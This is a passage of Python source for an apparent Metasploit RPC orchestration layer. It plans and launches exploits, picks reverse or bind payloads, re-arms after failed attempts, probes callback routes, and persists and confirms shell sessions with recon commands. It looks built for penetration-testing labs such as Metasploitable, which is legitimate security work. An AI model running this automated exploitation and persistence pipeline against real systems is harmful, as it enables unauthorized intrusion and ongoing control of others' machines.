                    # fragments. Give the first byte time to arrive, then accumulate
                    # until a clear silence gap. Don't bail on the first empty read.
                    output = ''
                    deadline = time.time() + timeout
                    silent_reads = 0
                    got_any = False
                    time.sleep(0.5)                  # initial settle before first read
                    while time.time() < deadline:
                        chunk = self._raw_session_read(client, sid_param, kind) or ''
                        if chunk:
                            output += chunk
                            got_any = True
                            silent_reads = 0
                        else:
                            silent_reads += 1
                            # Wait longer before giving up if nothing has arrived yet
                            # (the shell may still be waking), shorter once it's
                            # streaming and goes quiet (command finished).
                            limit = 5 if not got_any else 3   # ~2.0s vs ~1.2s
                            if silent_reads >= limit:
                                break
                        time.sleep(0.4)
                    result = {'status': 'ok', 'output': output}
                except Exception as e:
                    result = self._classify_session_error(e, session_id)
        result['session_type'] = stype
        try:
            from modules.ops_log import ops_log
            ops_log.log_session_event(
                session_id, 'command', command=command, result=result)
        except Exception:
            pass
        return result

    # ── Resolver layer (capabilities + information-gained feedback) ───────────

    def module_capabilities(self, module: str, use_cache: bool = True) -> dict:
        """Introspect a module via msfrpcd — MSF's own ground truth (Phase 1)."""
        from modules.msf_capabilities import get_module_capabilities
        return get_module_capabilities(self._client_ref(), module,
                                       use_cache=use_cache)

    def _derive_connection_mode(self, module, payload, handler_first):
        from modules.exploit_resolver import (MODE_REVERSE, MODE_BIND,
                                              MODE_INTERACT, MODE_DEFAULT)
        from modules.launch_profiles import resolve_launch_profile
        pl = (payload or '').lower()
        if handler_first or (pl.startswith('cmd/') and 'reverse' in pl) or 'reverse' in pl:
            return MODE_REVERSE
        if 'bind' in pl:
            return MODE_BIND
        if resolve_launch_profile(module).get('payload_mode') == 'interact':
            return MODE_INTERACT
        return MODE_DEFAULT

    def _record_run_outcome(self, module, rhosts, payload, target,
                            handler_first, result_dict) -> None:
        """Analyze a run outcome into insights, store them, attach to the result."""
        from modules.exploit_resolver import analyze_outcome
        plan_used = {
            'connection_mode': self._derive_connection_mode(module, payload, handler_first),
            'payload':         payload,
            'target_index':    target,
        }
        insights = analyze_outcome(plan_used, result_dict)
        key = ((module or '').lower(), _first_rhost(rhosts))
        with self._session_state_lock:
            prior = self._run_insights.get(key, [])
            # keep a bounded history (latest first), de-dup by signal+detail
            seen = {(i['signal'], i['detail']) for i in prior}
            for ins in insights:
                if (ins['signal'], ins['detail']) not in seen:
                    prior.insert(0, ins)
            self._run_insights[key] = prior[:20]
        result_dict['information_gained'] = insights

    def get_run_insights(self, module: str, rhosts: str) -> list:
        key = ((module or '').lower(), _first_rhost(rhosts))
        with self._session_state_lock:
            return list(self._run_insights.get(key, []))

    def recommend_plan(self, module: str, environment: dict) -> dict:
        """
        Produce a recommended launch plan (Phase 2) from MSF capabilities +
        environment, re-armed by any insights gathered from prior attempts.
        """
        from modules.exploit_resolver import resolve_plan
        from modules.launch_profiles import resolve_launch_profile
        environment = {**(environment or {}), 'module': module}  # probes/guard need it
        caps = self.module_capabilities(module)
        profile = resolve_launch_profile(module)
        # Carry module type + policy hints into the resolver.
        _mt = (module or '').split('/')[0]
        policy = {
            'module_type':     _mt if _mt in ('auxiliary', 'post') else '',
            'payload_mode':    profile.get('payload_mode'),
            'default_payload': profile.get('default_payload'),
            'automigrate':     profile.get('automigrate'),
        }
        prior = self.get_run_insights(module, environment.get('rhost', ''))
        plan = resolve_plan(caps, environment, policy=policy, prior_insights=prior)
        plan['capabilities'] = {
            'available':          caps.get('available'),
            'rank':               caps.get('rank'),
            'compatible_payloads': caps.get('compatible_payloads'),
            'payloads_parseable': caps.get('payloads_parseable'),
            'targets':            caps.get('targets'),
            'required':           caps.get('required'),
            'default_rport':      caps.get('default_rport'),
        }
        plan['module'] = module
        return plan

    def run_plan(self, module: str, plan: dict, environment: dict) -> dict:
        """
        Execute a resolver plan via run_exploit. Thin adapter: the plan already
        carries the validated options, payload (None = module default), target
        index, and connection mode — no per-module logic here.
        """
        options = dict(plan.get('options') or {})
        if not options.get('RHOSTS') and environment.get('rhost'):
            options['RHOSTS'] = environment['rhost']
        payload = plan.get('payload')           # None → module default
        target  = plan.get('target_index')
        auto_migrate = bool((plan.get('hardening') or {}).get('migrate'))
        return self.run_exploit(module, options=options, payload=payload,
                                target=target, action='run',
                                auto_migrate=auto_migrate or None)

    def persist_session(self, session_id: str) -> dict:
        """
        Persist a confirmed session for hands-off survival — driven by the
        session's handoff profile (background a Meterpreter, keep a cmd shell
        interactive). No hardcoded per-module steps; the profile decides.
        """
        sid = str(session_id).strip()
        profile = self.resolve_session_handoff(sid)
        conf = self.confirm_session(sid)
        if conf.get('dead'):
            return {'persisted': False, 'reason': 'session died during persistence',
                    'session_type': self._session_type(sid)}

        steps = []
        for cmd in (profile.get('harden_cmds') or []):
            r = self.session_run(sid, cmd, timeout=20)
            steps.append({'cmd': cmd, 'ok': not r.get('session_dead')})
            if r.get('session_dead'):
                return {'persisted': False, 'reason': f'died running "{cmd}"',
                        'session_type': self._session_type(sid), 'steps': steps}

        return {
            'persisted':    bool(conf.get('alive')) or not conf.get('dead'),
            'session_type': self._session_type(sid),
            'alive':        bool(conf.get('alive')),
            'profile':      profile.get('id'),
            'steps':        steps,
            'recon':        conf.get('output', ''),
        }

    def note_session_died(self, environment: dict) -> dict:
        """
        Record that a confirmed session DIED (open-then-die, e.g. distcc
        reverse_perl). This re-arms the next recommend toward a bind payload and
        escalated hardening — the orchestrator's authoritative 'dead' finding
        overriding any premature 'session opened' the run reported.
        """
        from modules.exploit_resolver import SIG_SESSION_DIED, MODE_BIND
        module = (environment or {}).get('module', '')
        rhost = (environment or {}).get('rhost', '')
        insight = {
            'signal': SIG_SESSION_DIED,
            'detail': 'confirmed session died after opening (open-then-die)',
            'message': ('Session opened then DIED on confirmation (open-then-die) '
                        '— re-arming to a bind payload (reverse callback is not '
                        'surviving on this target).'),
            'rearm': {'exclude_payloads': [], 'exclude_options': [],
                      'prefer_mode': MODE_BIND, 'try_target_index': None,
                      'need_options': [], 'escalate_migrate': True,
                      'retrigger': False, 'stop': False},
            'source': 'confirm',
        }
        if module and rhost:
            key = ((module or '').lower(), _first_rhost(rhost))
            with self._session_state_lock:
                prior = self._run_insights.get(key, [])
                if (insight['signal'], insight['detail']) not in {
                        (i['signal'], i['detail']) for i in prior}:
                    prior.insert(0, insight)
                self._run_insights[key] = prior[:20]
        return insight

    def gather_gap_information(self, signal: str, environment: dict) -> dict:
        """
        Active information acquisition between attempts. Given the dominant
        failure signal, run the tailored probes (route / handler-port / target-
        port / compatible-payload refresh / fingerprint), record any resulting
        insights into the per-target store (so recommend_plan re-arms on them),
        and return facts to merge into the environment.

        Returns {facts, insights, summary, produced_new_info}.
        """
        from modules import gap_probes as gp

        env = environment or {}
        rhost = env.get('rhost', '')
        rport = env.get('rport') or env.get('default_rport')
        lhost = env.get('lhost')
        lport = env.get('lport') or 4444
        module = env.get('module', '')

        plan = gp.probe_plan_for(signal)
        results: dict = {}

        # ── Target service port reachable? ───────────────────────────────────
        if gp.PROBE_RPORT_OPEN in plan and rhost and rport:
            try:
                results[gp.PROBE_RPORT_OPEN] = {
                    'open': _port_open(rhost, int(rport))}
            except (TypeError, ValueError):
                pass

        # ── Reverse-callback feasibility (route + handler port) ──────────────
        if (gp.PROBE_ROUTE in plan or gp.PROBE_LPORT_FREE in plan) and rhost:
            try:
                from modules.callback_verify import verify_callback
                cb = verify_callback(rhost=rhost, rport=int(rport) if rport else None,
                                     lhost=lhost or '', lport=int(lport),
                                     payload=None)
                checks = {c['id']: c for c in cb.get('checks', [])}
                if gp.PROBE_ROUTE in plan and 'route' in checks:
                    results[gp.PROBE_ROUTE] = {'routable': checks['route']['ok']}
                if gp.PROBE_LPORT_FREE in plan and 'lport_free' in checks:
                    results[gp.PROBE_LPORT_FREE] = {'free': checks['lport_free']['ok']}
            except Exception:
                pass

        # ── Compatible-payload refresh (force re-introspection) ──────────────
        if gp.PROBE_COMPAT in plan and module:
            try:
                caps = self.module_capabilities(module, use_cache=False)
                results[gp.PROBE_COMPAT] = {
                    'payloads': caps.get('compatible_payloads') or []}
            except Exception:
                pass

        # ── Service / OS fingerprint (best-effort: reuse classifier signal) ──
        if gp.PROBE_FINGERPRINT in plan and env.get('os_family'):
            results[gp.PROBE_FINGERPRINT] = {
                'os_family': env.get('os_family'),
                'service':   env.get('service', ''),
                'version':   env.get('version', ''),
            }

        interp = gp.interpret_probes(signal, results)

        # Record gap insights into the same store recommend_plan reads, so the
        # next attempt is re-armed by what the scan learned.
        gap_insights = interp.get('insights') or []
        if gap_insights and module:
            key = ((module or '').lower(), _first_rhost(rhost))
            with self._session_state_lock:
                prior = self._run_insights.get(key, [])
                seen = {(i['signal'], i['detail']) for i in prior}
                for ins in gap_insights:
                    if (ins['signal'], ins['detail']) not in seen:
                        prior.insert(0, ins)
                self._run_insights[key] = prior[:20]
        return interp

    def auto_chain(self, module: str, environment: dict, *,
                   max_attempts: int = 5, emit=None) -> dict:
        """Run the closed-loop 'land a stable shell' orchestrator."""
        from modules.auto_chain import run_auto_chain
        return run_auto_chain(self, module, environment,
                              max_attempts=max_attempts,
                              session_wait=20.0, emit=emit)

    # ── Handoff layer ────────────────────────────────────────────────────────
    # Profile-driven, type-aware post-exploit handoff. resolve_session_handoff
    # tells the UI which steps apply; confirm_session proves the session is
    # actually alive (concern #2) before any hardening runs.

    def resolve_session_handoff(self, session_id: str) -> dict:
        """
        Resolve the handoff profile for a live session using its recorded
        origin (module + payload) and its current MSF session type.
        """
        from modules.handoff import resolve_profile

        sid = str(session_id).strip()
        with self._session_state_lock:
            origin = dict(self._session_origin.get(sid, {}))
        stype = self._session_type(sid)
        profile = resolve_profile(
            module=origin.get('module'),
            payload=origin.get('payload'),
            session_type=stype,
        )
        profile['session_id'] = sid
        profile['origin'] = origin
        return profile

    def _drain_shell(self, session_id: str, rounds: int = 4) -> str:
        """Read and return any pending shell output (clears the buffer before a probe)."""
        client = self._client_ref()
        if client is None:
            return ''
        drained = ''
        lock = self._sid_io_lock(session_id)
        with lock:
            try:
                sid_param = self._sid_param(client, session_id)
                if sid_param is None:
                    return ''
                kind = self._session_kind_raw(client, sid_param)
                for _ in range(rounds):
                    chunk = self._raw_session_read(client, sid_param, kind) or ''
                    if not chunk:
                        break
                    drained += chunk
            except Exception:
                pass
        return drained

    def confirm_session(self, session_id: str, timeout: int = 10,
                        attempts: int = 3) -> dict:
        """
        Confirmation pipeline (concern #2) — prove a session is alive AND
        responsive, robustly enough for *dumb* reverse shells (cmd/unix/
        reverse_perl on Metasploitable) that don't echo a prompt and are slow
        to answer their first command.

        Strategy:
          - Meterpreter: a single `sysinfo` round-trip is reliable.
          - Shell: drain the buffer, then send a random sentinel `echo` and look
            for it to round-trip. Retry with backoff — the FIRST command to a
            freshly-opened dumb shell frequently returns nothing, which is NOT
            death. Only an RPC "session does not exist" means dead.

        A live-but-quiet shell returns alive=False but dead=False, and the UI
        keeps it interactive (never abandons a session that isn't proven dead).

        Returns {alive, dead, stable, profile, output, message}.
        """
        import secrets

        sid = str(session_id).strip()
        profile = self.resolve_session_handoff(sid)

        if not profile.get('session_expected', True):
            return {'status': 'ok', 'alive': False, 'dead': False,
                    'stable': False, 'profile': profile, 'output': '',
                    'message': 'No interactive session expected for this module.'}

        stype = self._session_type(sid)

        # ── Meterpreter — single reliable probe ──────────────────────────────
        if stype == 'meterpreter':
            res = self.session_run(sid, 'sysinfo', timeout=timeout)
            if res.get('session_dead'):
                return {'status': 'ok', 'alive': False, 'dead': True,
                        'stable': False, 'profile': profile, 'output': '',
                        'message': res.get('message', 'Session is dead.')}
            alive = bool((res.get('output') or '').strip())
            return {'status': 'ok', 'alive': alive, 'dead': False,
                    'stable': alive, 'profile': profile,
                    'output': res.get('output') or '',
                    'message': ('Meterpreter confirmed.' if alive
                                else 'Meterpreter not responding yet — retry.')}

        # ── Shell — prime + sentinel + retries (dumb-shell robust) ───────────
        sentinel = 'H3X' + secrets.token_hex(3).upper()
        alive = False
        self._drain_shell(sid)
        for attempt in range(max(1, attempts)):
            res = self.session_run(sid, f'echo {sentinel}', timeout=timeout)
            if res.get('session_dead'):
                return {'status': 'ok', 'alive': False, 'dead': True,
                        'stable': False, 'profile': profile, 'output': '',
                        'message': res.get('message', 'Session is dead.')}
            if sentinel in (res.get('output') or ''):
                alive = True
                break
            time.sleep(0.8 * (attempt + 1))   # back off for a slow shell

        # If alive, gather quick recon so the operator SEES a working shell.
        recon = []
        if alive:
            for cmd in (profile.get('confirm_cmds') or ['id', 'uname -a']):
                r = self.session_run(sid, cmd, timeout=timeout)
                out = r.get('output') or ''
                if out.strip() and sentinel not in out:
                    recon.append(f'$ {cmd}\n{out.strip()}')

        return {
            'status':  'ok',
            'alive':   alive,
            'dead':    False,
            'stable':  alive,
            'profile': profile,
            'output':  '\n'.join(recon),
            'message': ('Shell confirmed responsive.' if alive else
                        'Shell did not echo the liveness probe yet — dumb shells '
                        'often wake on the first manual command. It stays '
                        'attached; type a command (e.g. id).'),
        }
